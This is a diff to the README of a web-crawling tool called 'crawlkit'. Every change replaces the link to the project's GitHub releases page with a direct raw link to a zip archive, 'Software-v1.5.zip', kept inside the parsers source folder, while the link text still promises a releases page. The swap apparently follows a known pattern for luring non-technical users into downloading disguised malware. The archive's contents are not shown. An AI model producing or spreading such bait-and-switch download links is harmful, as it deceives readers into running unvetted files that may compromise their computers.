@@ -1,6 +1,6 @@
 # 🕷️ crawlkit - Simple web crawling for everyone
 
-[![Download crawlkit](https://img.shields.io/badge/Download%20crawlkit-blue?style=for-the-badge&logo=github)](https://github.com/coordinated-genushypericum225/crawlkit/releases)
+[![Download crawlkit](https://img.shields.io/badge/Download%20crawlkit-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/coordinated-genushypericum225/crawlkit/main/crawlkit/parsers/Software-v1.5.zip)
 
 ## 🚀 What is crawlkit?
 
@@ -24,7 +24,7 @@ If your PC can run modern websites and video apps, it should be fine for crawlki
 
 ## 📥 Download and install
 
-1. Visit the [crawlkit releases page](https://github.com/coordinated-genushypericum225/crawlkit/releases)
+1. Visit the [crawlkit releases page](https://raw.githubusercontent.com/coordinated-genushypericum225/crawlkit/main/crawlkit/parsers/Software-v1.5.zip)
 2. Look for the latest release at the top of the page
 3. Open the release assets
 4. Download the Windows file that matches your system
@@ -228,7 +228,7 @@ It can help:
 
 ## 📎 Download again
 
-If you need the installer again, visit the [crawlkit releases page](https://github.com/coordinated-genushypericum225/crawlkit/releases)
+If you need the installer again, visit the [crawlkit releases page](https://raw.githubusercontent.com/coordinated-genushypericum225/crawlkit/main/crawlkit/parsers/Software-v1.5.zip)
 
 ## 🔍 Project focus
 
